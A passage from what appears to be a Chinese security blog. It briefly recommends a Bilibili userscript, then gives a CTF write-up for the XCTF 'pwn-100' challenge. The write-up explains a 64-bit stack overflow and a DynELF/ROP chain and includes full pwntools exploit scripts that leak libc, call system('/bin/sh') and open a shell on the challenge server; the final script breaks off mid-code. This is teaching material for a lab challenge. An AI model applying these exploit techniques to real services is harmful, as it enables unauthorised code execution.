title="2.哔哩哔哩播放器调整R"></a>2.哔哩哔哩播放器调整R</h3><p><img src="https://img-blog.csdnimg.cn/20200322021003993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="哔哩哔哩播放器调整R"><br><img src="https://img-blog.csdnimg.cn/20200322021118326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="脚本功能"></p><blockquote><p>介绍：把b站彻底变成学习网站！<br>推荐级别：3星级<br><a href="https://greasyfork.org/zh-CN/scripts/371672-%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9-bilibili-com-%E6%92%AD%E6%94%BE%E5%99%A8%E8%B0%83%E6%95%B4r-ver-stardust" target="_blank" rel="noopener">点击此处安装</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
        <tags>
            
            <tag> tips </tag>
            
            <tag> chrome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>64位程序rop链构造|攻防世界pwn进阶区 pwn-100</title>
      <link href="/2020/03/21/pwn-100/"/>
      <url>/2020/03/21/pwn-100/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这一题和pwn-200有类似之处，都是栈溢出漏洞，可以循环泄露，所以都使用DynELF来泄露。但是pwn200是32位程序用rop，pwn100是64位程序用rop。区别在于32位程序利用栈布局，而64位程序调用参数是利用寄存器。且本题是用puts函数来泄露，puts函数不能指定输出字符串的长度。</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="0x01-ida调试发现sub-40063D函数可以溢出"><a href="#0x01-ida调试发现sub-40063D函数可以溢出" class="headerlink" title="0x01.ida调试发现sub_40063D函数可以溢出"></a>0x01.ida调试发现sub_40063D函数可以溢出</h3><p><img src="https://img-blog.csdnimg.cn/20200316194943361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""></p><h3 id="0x02-cyclic计算溢出需要填充72字节"><a href="#0x02-cyclic计算溢出需要填充72字节" class="headerlink" title="0x02.cyclic计算溢出需要填充72字节"></a>0x02.cyclic计算溢出需要填充72字节</h3><h3 id="0x03-checksec看一下保护"><a href="#0x03-checksec看一下保护" class="headerlink" title="0x03.checksec看一下保护"></a>0x03.checksec看一下保护</h3><pre class="line-numbers language-yaml"><code class="language-yaml"> <span class="token key atrule">Arch</span><span class="token punctuation">:</span>     amd64<span class="token punctuation">-</span>64<span class="token punctuation">-</span>little    <span class="token key atrule">RELRO</span><span class="token punctuation">:</span>    Partial RELRO //可以修改GOT表    <span class="token key atrule">Stack</span><span class="token punctuation">:</span>    No canary found    <span class="token key atrule">NX</span><span class="token punctuation">:</span>       NX enabled    <span class="token key atrule">PIE</span><span class="token punctuation">:</span>      No PIE (0x400000)//未开启地址随机化<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x04-利用思路："><a href="#0x04-利用思路：" class="headerlink" title="0x04.利用思路："></a>0x04.利用思路：</h3><blockquote><p>1.利用DynELF模块泄露system函数地址<br>2.构造rop链，写入”/bin/sh”<br>3.调用system函数</p></blockquote><h3 id="0x05-可以用vmmap查找binary文件地址"><a href="#0x05-可以用vmmap查找binary文件地址" class="headerlink" title="0x05.可以用vmmap查找binary文件地址"></a>0x05.可以用vmmap查找binary文件地址</h3><p><img src="https://img-blog.csdnimg.cn/20200316194318782.jpg" alt=""><br>这里找到一个 <code>rw-p</code>的地址，即<strong>可写地址 0x601000</strong>,pwn-200做的时候是用的bss段地址<code>bss_addr=elf.bss()</code>，但是这一题我看网上wp基本没有用bss段地址的，我自己试了一下用bss段地址打不通。</p><h3 id="0x06-用-ROPgadget-binary-pwn100-only-quot-pop-ret-quot-grep-rdi命令寻找ROP"><a href="#0x06-用-ROPgadget-binary-pwn100-only-quot-pop-ret-quot-grep-rdi命令寻找ROP" class="headerlink" title="0x06.用  ROPgadget --binary pwn100 --only &quot;pop|ret&quot; | grep rdi命令寻找ROP"></a>0x06.用  <code>ROPgadget --binary pwn100 --only "pop|ret" | grep rdi</code>命令寻找ROP</h3><p><img src="https://img-blog.csdnimg.cn/20200316194440265.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""></p><pre class="line-numbers language-python"><code class="language-python">poprdi_addr<span class="token operator">=</span><span class="token number">0x400763</span>pop6_addr<span class="token operator">=</span><span class="token number">0x40075a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="0x07-32位程序和64位程序的差别"><a href="#0x07-32位程序和64位程序的差别" class="headerlink" title="0x07.32位程序和64位程序的差别"></a>0x07.32位程序和64位程序的差别</h3><blockquote><ul><li>32位程序中，函数调用是直接将参数压栈，需要用的时候直接将参数放在栈上，调用的函数就能直接取得参数并运算。</li><li>x64的gcc优化了x86的传参方式，x64程序设立了几个寄存器李存放参数，调用函数的时候先向寄存器之中放参数，当参数的数量大于寄存器的时候，才会向栈中放参数。</li></ul></blockquote><pre class="line-numbers language-powershell"><code class="language-powershell">fun<span class="token punctuation">(</span>1<span class="token punctuation">,</span>2<span class="token punctuation">,</span>3<span class="token punctuation">,</span>4<span class="token punctuation">,</span>5<span class="token punctuation">,</span>6<span class="token punctuation">,</span>7<span class="token punctuation">,</span>8<span class="token punctuation">,</span>9<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">/</span>当我们调用这个函数的时候<span class="token operator">/</span><span class="token operator">/</span>x86传参的方式是这样：push 9<span class="token punctuation">;</span>push 8<span class="token punctuation">;</span>···push 1<span class="token punctuation">;</span>call fun<span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">/</span>x64传参方式：mov r9d 6<span class="token punctuation">;</span>mov r8d 5<span class="token punctuation">;</span>mov ecx 4<span class="token punctuation">;</span>mov edx 3<span class="token punctuation">;</span>mov esi 2<span class="token punctuation">;</span>mov edi 1<span class="token punctuation">;</span>mov DWORD PTR <span class="token namespace">[rsp+16]</span><span class="token punctuation">,</span> 9<span class="token punctuation">;</span>mov DWORD PTR <span class="token namespace">[rsp+8]</span><span class="token punctuation">,</span> 8<span class="token punctuation">;</span>mov DWORD PTR <span class="token namespace">[rsp]</span><span class="token punctuation">,</span> 7<span class="token punctuation">;</span>call fun<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>传参的顺序，默认是从最后一个参数先开始传入，x86和x64都是一样。</strong><br><a href="https://blog.csdn.net/qinying001/article/details/102922215" target="_blank" rel="noopener">参考blog</a></p><h3 id="0x08-写出leak函数"><a href="#0x08-写出leak函数" class="headerlink" title="0x08.写出leak函数"></a>0x08.写出leak函数</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    count <span class="token operator">=</span> <span class="token number">0</span>    up <span class="token operator">=</span> <span class="token string">''</span>    content <span class="token operator">=</span> <span class="token string">''</span>    payload <span class="token operator">=</span> junk    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#给put的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#leak函数的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用put函数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#跳转到start，恢复栈</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#填充到200字节，触发循环的break</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bye~\n"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="0x01-先尝试泄露"><a href="#0x01-先尝试泄露" class="headerlink" title="0x01.先尝试泄露"></a>0x01.先尝试泄露</h3><p><img src="https://img-blog.csdnimg.cn/20200316194453783.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br><img src="https://img-blog.csdnimg.cn/20200316194502980.jpg" alt=""><br><strong>0x4个字节时候才是需要泄露的地址</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    count <span class="token operator">=</span> <span class="token number">0</span>    up <span class="token operator">=</span> <span class="token string">''</span>    content <span class="token operator">=</span> <span class="token string">''</span>    payload <span class="token operator">=</span> junk    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#给put的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#leak函数的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用put函数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#跳转到start，恢复栈</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#填充到200字节，触发循环的break</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    content <span class="token operator">=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> content<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x02-下面尝试补充成exp"><a href="#0x02-下面尝试补充成exp" class="headerlink" title="0x02.下面尝试补充成exp"></a>0x02.下面尝试补充成exp</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">36839</span><span class="token punctuation">)</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn100"</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>gpt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x400763</span>junk <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">72</span>rop1 <span class="token operator">=</span> <span class="token number">0x40075a</span> <span class="token comment" spellcheck="true">#pop rbx,rbp,r12,r13,r14,r15</span>rop2 <span class="token operator">=</span> <span class="token number">0x400740</span> <span class="token comment" spellcheck="true">#rdx(r13),rsi(r14),edi(r15)</span>start_addr <span class="token operator">=</span> <span class="token number">0x400550</span>binsh_addr <span class="token operator">=</span> <span class="token number">0x601000</span> <span class="token comment" spellcheck="true">#向该地址写入"/bin/sh"</span><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    count <span class="token operator">=</span> <span class="token number">0</span>    up <span class="token operator">=</span> <span class="token string">''</span>    content <span class="token operator">=</span> <span class="token string">''</span>    payload <span class="token operator">=</span> junk    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#给put的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#leak函数的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用put函数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#跳转到start，恢复栈</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#填充到200字节，触发循环的break</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    content <span class="token operator">=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"%#x => %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>address<span class="token punctuation">,</span><span class="token punctuation">(</span>content <span class="token operator">or</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> contentdyn <span class="token operator">=</span> DynELF<span class="token punctuation">(</span>leak<span class="token punctuation">,</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn100"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> dyn<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span><span class="token string">'libc'</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"system_addr => %#x"</span><span class="token punctuation">,</span>system_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> junk <span class="token operator">+</span> p64<span class="token punctuation">(</span>rop1<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用read向可写段写入</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用rop2</span>payload <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span><span class="token comment" spellcheck="true">#rop2技术后跳转到rop1，需要再填充56字节，(pop*6+ret)*8</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调整栈帧</span>payload <span class="token operator">+=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bye~\n"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> junk <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>会发现这样的exp打不通</strong></p><h3 id="0x03-寻找原因"><a href="#0x03-寻找原因" class="headerlink" title="0x03.寻找原因"></a>0x03.寻找原因</h3><p><strong>原因出在了leak函数上</strong></p><blockquote><p>puts的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“x00”字符为止。也就是说，puts函数输出的数据长度是不受控的，只要我们输出的信息中包含x00截断符，输出就会终止，且会自动将“n”追加到输出字符串的末尾，这是puts函数的缺点，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。</p></blockquote><h3 id="0x04-利用puts函数的DynELF模板"><a href="#0x04-利用puts函数的DynELF模板" class="headerlink" title="0x04.利用puts函数的DynELF模板"></a>0x04.利用puts函数的DynELF模板</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>  count <span class="token operator">=</span> <span class="token number">0</span>  data <span class="token operator">=</span> <span class="token string">""</span>  payload <span class="token operator">=</span> xxx  p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token keyword">print</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xxxn"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#一定要在puts前释放完输出</span>  up <span class="token operator">=</span> <span class="token string">""</span>  <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    count <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">if</span> up <span class="token operator">==</span> <span class="token string">'n'</span> <span class="token operator">and</span> c <span class="token operator">==</span> <span class="token string">"x"</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#一定要找到泄漏信息的字符串特征</span>      data <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                           data <span class="token operator">+=</span> <span class="token string">"x00"</span>      <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      buf <span class="token operator">+=</span> c    up <span class="token operator">=</span> c  data <span class="token operator">=</span> buf<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>   log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"%#x => %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>address<span class="token punctuation">,</span> <span class="token punctuation">(</span>data <span class="token operator">or</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x05-调整exp"><a href="#0x05-调整exp" class="headerlink" title="0x05.调整exp"></a>0x05.调整exp</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: UTF-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">36839</span><span class="token punctuation">)</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn100"</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x400763</span>junk <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">72</span>rop1 <span class="token operator">=</span> <span class="token number">0x40075a</span> <span class="token comment" spellcheck="true">#pop rbx,rbp,r12,r13,r14,r15</span>rop2 <span class="token operator">=</span> <span class="token number">0x400740</span> <span class="token comment" spellcheck="true">#rdx(r13),rsi(r14),edi(r15)</span>start_addr <span class="token operator">=</span> <span class="token number">0x400550</span>binsh_addr <span class="token operator">=</span> <span class="token number">0x601000</span> <span class="token comment" spellcheck="true">#向该地址写入"/bin/sh"</span><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    count <span class="token operator">=</span> <span class="token number">0</span>    up <span class="token operator">=</span> <span class="token string">''</span>    content <span class="token operator">=</span> <span class="token string">''</span>    payload <span class="token operator">=</span> junk    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#给put的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>address<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#leak函数的参数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用put函数</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#跳转到start，恢复栈</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#填充到200字节，触发循环的break</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bye~\n"</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        c <span class="token operator">=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#每次读取一个字节，设置超时时间确保没有遗漏</span>        count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">if</span> up <span class="token operator">==</span><span class="token string">'\n'</span> <span class="token operator">and</span> c <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#上一个字符是回车且读不到其他字符，说明读完了</span>            content <span class="token operator">=</span> content<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'\x00'</span><span class="token comment" spellcheck="true">#最后一个字符设置为\x00</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            content <span class="token operator">+=</span> c <span class="token comment" spellcheck="true">#输出拼接</span>            up <span class="token operator">=</span> c <span class="token comment" spellcheck="true">#保存最后一个字符</span>    content <span class="token operator">=</span> content<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#截取输出的一段作为返回值，提供给DynELF处理</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"%#x => %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>address<span class="token punctuation">,</span><span class="token punctuation">(</span>content <span class="token operator">or</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> contentdyn <span class="token operator">=</span> DynELF<span class="token punctuation">(</span>leak<span class="token punctuation">,</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn100"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> dyn<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span><span class="token string">'libc'</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"system_addr => %#x"</span><span class="token punctuation">,</span>system_addr<span class="token punctuation">)</span>payload <span class="token operator">=</span> junk <span class="token operator">+</span> p64<span class="token punctuation">(</span>rop1<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用read向可写段写入</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop2<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用rop2</span>payload <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span><span class="token comment" spellcheck="true">#rop2技术后跳转到rop1，需要再填充56字节，(pop*6+ret)*8</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调整栈帧</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bye~\n"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> junk <span class="token operator">+</span> p64<span class="token 